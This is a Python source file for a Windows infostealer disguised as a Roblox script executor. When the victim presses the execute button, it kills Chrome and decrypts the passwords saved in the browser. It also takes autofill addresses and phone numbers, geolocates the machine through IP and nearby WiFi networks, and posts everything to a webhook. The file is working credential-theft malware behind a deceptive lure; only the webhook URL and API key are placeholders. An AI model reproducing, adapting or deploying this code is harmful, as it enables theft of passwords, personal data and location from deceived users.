import http.client
import socket
import os
import subprocess
import sqlite3
import shutil
import json
import time
import urllib.parse
import base64
import win32crypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import tkinter as tk
from tkinter import filedialog, simpledialog
from PIL import Image, ImageTk
import sys

WEBHOOK_URL = "your_webhook_url_here"
GOOGLE_API_KEY = "your_google_api_key_here"

def close_chrome():
    try:
        subprocess.run("taskkill /IM chrome.exe /F", shell=True, check=True)
        time.sleep(2)
    except subprocess.CalledProcessError:
        pass

def get_public_ip():
    conn = http.client.HTTPSConnection("api.ipify.org")
    try:
        conn.request("GET", "/?format=json")
        response = conn.getresponse()
        if response.status == 200:
            data = json.loads(response.read().decode())
            return data['ip']
        return "IP fetch failed"
    except Exception:
        return "IP fetch error"
    finally:
        conn.close()

def get_nearby_wifi():
    try:
        output = subprocess.check_output("netsh wlan show networks mode=Bssid", shell=True).decode('utf-8', errors="ignore")
        ssids = []
        for line in output.splitlines():
            if "SSID" in line and "BSSID" not in line:
                ssid = line.split(":", 1)[1].strip()
                if ssid:
                    ssids.append({"ssid": ssid})
        return ssids
    except Exception:
        return [{"ssid": "WiFi scan error"}]

def get_location(ip):
    nearby_wifi = get_nearby_wifi()
    
    if GOOGLE_API_KEY and nearby_wifi and "error" not in nearby_wifi[0]["ssid"].lower():
        conn = http.client.HTTPSConnection("www.googleapis.com")
        try:
            headers = {"Content-Type": "application/json"}
            payload = {"considerIp": True, "wifiAccessPoints": nearby_wifi}
            conn.request("POST", f"/geolocation/v1/geolocate?key={GOOGLE_API_KEY}", body=json.dumps(payload), headers=headers)
            response = conn.getresponse()
            if response.status == 200:
                data = json.loads(response.read().decode())
                return {
                    "lat": data["location"]["lat"],
                    "lon": data["location"]["lng"],
                    "accuracy": data.get("accuracy", "Unknown"),
                    "source": "Google Geolocation API"
                }
        except Exception:
            pass
        finally:
            conn.close()
    
    conn = http.client.HTTPConnection("ip-api.com")
    try:
        conn.request("GET", f"/json/{ip}")
        response = conn.getresponse()
        if response.status == 200:
            data = json.loads(response.read().decode())
            if data["status"] == "success":
                return {
                    "city": data.get("city", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "country": data.get("country", "Unknown"),
                    "lat": data.get("lat", "Unknown"),
                    "lon": data.get("lon", "Unknown"),
                    "source": "IP-API"
                }
            return {"error": "IP geolocation failed"}
        return {"error": "Location fetch failed"}
    except Exception:
        return {"error": "Location error"}
    finally:
        conn.close()

def decrypt_chrome_password(encrypted_value, key):
    try:
        if not encrypted_value.startswith(b'v10'):
            return "Unsupported format"
        encrypted_value = encrypted_value[3:]
        iv = encrypted_value[:12]
        tag = encrypted_value[-16:]
        ciphertext = encrypted_value[12:-16]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext) + decryptor.finalize().decode('utf-8')
    except Exception:
        return "Decryption failed"

def get_chrome_passwords():
    close_chrome()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    if not os.path.exists(db_path):
        return [{"website": "N/A", "username": "N/A", "password": "Login Data missing"}]
    
    temp_dir = os.environ["TEMP"]
    temp_db = os.path.join(temp_dir, "temp_login_data")
    
    if os.path.exists(temp_db):
        os.remove(temp_db)
    
    shutil.copyfile(db_path, temp_db)
    
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    if not os.path.exists(local_state_path):
        os.remove(temp_db)
        return [{"website": "N/A", "username": "N/A", "password": "Local State missing"}]
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    
    encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key")
    if not encrypted_key:
        os.remove(temp_db)
        return [{"website": "N/A", "username": "N/A", "password": "No key found"}]
    
    key = base64.b64decode(encrypted_key)[5:]
    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    passwords = []
    for row in cursor.fetchall():
        url, username, encrypted_password = row
        if encrypted_password:
            password = decrypt_chrome_password(encrypted_password, key)
            passwords.append({"website": url, "username": username, "password": password})
    
    conn.close()
    os.remove(temp_db)
    return passwords if passwords else [{"website": "N/A", "username": "N/A", "password": "No passwords"}]

def get_chrome_autofill_data():
    close_chrome()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Web Data")
    if not os.path.exists(db_path):
        return {"addresses": [], "phone_numbers": [], "error": "Web Data missing"}
    
    temp_dir = os.environ["TEMP"]
    temp_db = os.path.join(temp_dir, "temp_web_data")
    
    if os.path.exists(temp_db):
        os.remove(temp_db)
    
    shutil.copyfile(db_path, temp_db)
    
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    
    addresses = []
    try:
        cursor.execute("SELECT first_name, street_address, city, state, zipcode, country, phone_number FROM addresses")
        for row in cursor.fetchall():
            name, street, city, state, zipcode, country, phone = row
            addresses.append({
                "name": name or "Unknown",
                "street": street or "",
                "city": city or "",
                "state": state or "",
                "zipcode": zipcode or "",
                "country": country or "",
                "phone": phone or ""
            })
    except Exception:
        pass
    
    phone_numbers = []
    try:
        cursor.execute("SELECT phone_number FROM addresses WHERE phone_number IS NOT NULL")
        for row in cursor.fetchall():
            phone_numbers.append(row[0])
    except Exception:
        pass
    
    conn.close()
    os.remove(temp_db)
    
    return {
        "addresses": addresses,
        "phone_numbers": list(set(phone_numbers))
    }

def collect_system_info():
    public_ip = get_public_ip()
    location = get_location(public_ip) if "error" not in public_ip.lower() else {"error": "IP unavailable"}
    autofill_data = get_chrome_autofill_data()
    
    saved_addresses = []
    for addr in autofill_data["addresses"]:
        full_address = f"{addr['street']}, {addr['city']}, {addr['state']} {addr['zipcode']}, {addr['country']}"
        saved_addresses.append({
            "name": addr["name"],
            "address": full_address.strip(", "),
            "phone": addr["phone"]
        })
    
    return {
        "hostname": socket.gethostname(),
        "public_ip": public_ip,
        "location": location,
        "username": os.getlogin(),
        "ssh_username": "your_ssh_username_here",
        "ssh_password": "your_ssh_password_here",
        "chrome_passwords": get_chrome_passwords(),
        "email_addresses": ["your_email@example.com"],
        "saved_addresses": saved_addresses,
        "phone_numbers": autofill_data["phone_numbers"]
    }

def send_to_webhook(data):
    emails_str = "\n".join(data["email_addresses"])[:1024]
    addresses_str = "\n".join([f"{a['name']}: {a['address']} (Tel: {a['phone']})" for a in data["saved_addresses"]])[:1024]
    phones_str = "\n".join(data["phone_numbers"])[:1024]
    
    location_str = "Location unavailable"
    if "error" not in data["location"]:
        if "city" in data["location"]:
            location_str = f"Source: {data['location']['source']}\nCity: {data['location']['city']}\nRegion: {data['location']['region']}\nCountry: {data['location']['country']}\nCoords: {data['location']['lat']}, {data['location']['lon']}"
        else:
            location_str = f"Source: {data['location']['source']}\nCoords: {data['location']['lat']}, {data['location']['lon']}\nAccuracy: {data['location']['accuracy']}m"

    chrome_passwords = [f"{i+1}. {p['website']} - User: {p['username']} - Pass: {p['password']}" for i, p in enumerate(data["chrome_passwords"])]
    embeds = [
        {
            "title": "PC Data",
            "fields": [
                {"name": "Hostname", "value": data["hostname"][:1024], "inline": True},
                {"name": "Public IP", "value": data["public_ip"][:1024], "inline": True},
                {"name": "Location", "value": location_str[:1024], "inline": False},
                {"name": "Username", "value": data["username"][:1024], "inline": True},
                {"name": "SSH User", "value": data["ssh_username"][:1024], "inline": True},
                {"name": "SSH Pass", "value": data["ssh_password"][:1024], "inline": True},
                {"name": "Emails", "value": emails_str or "None", "inline": False},
                {"name": "Addresses", "value": addresses_str or "None", "inline": False},
                {"name": "Phones", "value": phones_str or "None", "inline": False}
            ],
            "color": 5814783
        }
    ]

    for i in range(0, len(chrome_passwords), 10):
        chunk = "\n".join(chrome_passwords[i:i + 10])[:1024]
        embeds.append({
            "title": f"Passwords (Part {i // 10 + 2})",
            "fields": [{"name": "Passwords", "value": chunk or "None", "inline": False}],
            "color": 5814783
        })

    payload = {"content": "System Info:", "embeds": embeds}
    parsed_url = urllib.parse.urlparse(WEBHOOK_URL)
    conn = http.client.HTTPSConnection(parsed_url.netloc)
    
    try:
        payload_json = json.dumps(payload)
        headers = {"Content-Type": "application/json"}
        conn.request("POST", parsed_url.path, body=payload_json, headers=headers)
        response = conn.getresponse()
        response.status == 204 or print(f"Webhook error: {response.status}")
    except Exception:
        print("Webhook failed")
    finally:
        conn.close()

def make_draggable(root, frame):
    def start_drag(event):
        frame._drag_x = event.x
        frame._drag_y = event.y
        frame._root_x = root.winfo_x()
        frame._root_y = root.winfo_y()

    def drag(event):
        x = frame._root_x + (event.x - frame._drag_x)
        y = frame._root_y + (event.y - frame._drag_y)
        root.geometry(f"+{x}+{y}")

    frame.bind("<Button-1>", start_drag)
    frame.bind("<B1-Motion>", drag)

def create_fake_executor_ui():
    root = tk.Tk()
    root.geometry("650x500")
    root.configure(bg="#000000")
    root.overrideredirect(True)

    title_frame = tk.Frame(root, bg="#000000", height=35)
    title_frame.pack(fill="x")
    make_draggable(root, title_frame)
    
    title_label = tk.Label(title_frame, text="XScripting Executor v1.1", font=("Segoe UI", 12, "bold"), bg="#000000", fg="#00C4FF", padx=15, pady=5)
    title_label.pack(side=tk.LEFT)
    
    close_button = tk.Button(title_frame, text="×", command=root.destroy, bg="#000000", fg="#FF5555", bd=0, font=("Segoe UI", 14, "bold"), padx=10, pady=2)
    close_button.pack(side=tk.RIGHT)
    close_button.bind("<Enter>", lambda e: close_button.config(bg="#1A1A1A"))
    close_button.bind("<Leave>", lambda e: close_button.config(bg="#000000"))

    tab_frame = tk.Frame(root, bg="#0F0F0F", height=30)
    tab_frame.pack(fill="x", pady=(5, 0))
    
    tab_label = tk.Label(tab_frame, text="Tab 1", font=("Segoe UI", 10, "bold"), bg="#0F0F0F", fg="#00C4FF", padx=15, pady=5)
    tab_label.pack(side=tk.LEFT)
    
    add_tab_button = tk.Button(tab_frame, text="+", command=lambda: code_text.insert(tk.END, "\n-- New Tab"), bg="#0F0F0F", fg="#00C4FF", bd=0, font=("Segoe UI", 10, "bold"), padx=10, pady=2)
    add_tab_button.pack(side=tk.RIGHT, padx=10)
    add_tab_button.bind("<Enter>", lambda e: add_tab_button.config(bg="#1A1A1A"))
    add_tab_button.bind("<Leave>", lambda e: add_tab_button.config(bg="#0F0F0F"))

    code_frame = tk.Frame(root, bg="#000000")
    code_frame.pack(pady=10, padx=10, fill="both", expand=True)
    
    code_text = tk.Text(code_frame, height=20, width=70, bg="#0F0F0F", fg="#00C4FF", insertbackground="#00C4FF", font=("Consolas", 11), bd=0, highlightthickness=1, highlightbackground="#00C4FF", relief="flat", wrap="word")
    code_text.pack(fill="both", expand=True)
    code_text.insert(tk.END, "-- Paste your Roblox Lua script here\nprint('Hello!')")

    toolbar_frame = tk.Frame(root, bg="#0F0F0F", height=50)
    toolbar_frame.pack(fill="x", side=tk.BOTTOM, pady=(0, 10))

    base_path = sys._MEIPASS if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
    icons_dir = os.path.join(base_path, "icons")

    try:
        settings_icon = ImageTk.PhotoImage(Image.open(os.path.join(icons_dir, "settings.png")).resize((24, 24), Image.Resampling.LANCZOS))
        open_icon = ImageTk.PhotoImage(Image.open(os.path.join(icons_dir, "open.png")).resize((24, 24), Image.Resampling.LANCZOS))
        edit_icon = ImageTk.PhotoImage(Image.open(os.path.join(icons_dir, "edit.png")).resize((24, 24), Image.Resampling.LANCZOS))
        attach_icon = ImageTk.PhotoImage(Image.open(os.path.join(icons_dir, "attach.png")).resize((24, 24), Image.Resampling.LANCZOS))
        execute_icon = ImageTk.PhotoImage(Image.open(os.path.join(icons_dir, "execute.png")).resize((24, 24), Image.Resampling.LANCZOS))
    except Exception:
        return

    def create_button(image, command):
        btn = tk.Button(toolbar_frame, image=image, bg="#0F0F0F", bd=0, padx=10, pady=5, command=command)
        btn.image = image
        btn.pack(side=tk.LEFT, padx=5, pady=5)
        btn.bind("<Enter>", lambda e: btn.config(bg="#1A1A1A"))
        btn.bind("<Leave>", lambda e: btn.config(bg="#0F0F0F"))
        return btn

    def on_settings():
        value = simpledialog.askstring("Settings", "Enter a value:", initialvalue="Default")
        if value:
            print(f"Set to: {value}")

    def on_file():
        file_path = filedialog.askopenfilename(filetypes=[("Lua files", "*.lua"), ("All files", "*.*")])
        if file_path:
            with open(file_path, "r") as f:
                code_text.delete(1.0, tk.END)
                code_text.insert(tk.END, f.read())

    def on_edit():
        current = code_text.get(1.0, tk.END)
        new_text = simpledialog.askstring("Edit", "Edit script:", initialvalue=current)
        if new_text:
            code_text.delete(1.0, tk.END)
            code_text.insert(tk.END, new_text)

    def on_attach():
        file_path = filedialog.askopenfilename(filetypes=[("All files", "*.*")])
        if file_path:
            print(f"Attached: {file_path}")

    def on_execute():
        print("Running script...")
        system_info = collect_system_info()
        send_to_webhook(system_info)
        root.destroy()

    create_button(settings_icon, on_settings)
    create_button(open_icon, on_file)
    create_button(edit_icon, on_edit)
    create_button(attach_icon, on_attach)
    execute_button = create_button(execute_icon, on_execute)
    execute_button.pack(side=tk.RIGHT, padx=5, pady=5)

    root.mainloop()

if __name__ == "__main__":
    create_fake_executor_ui()
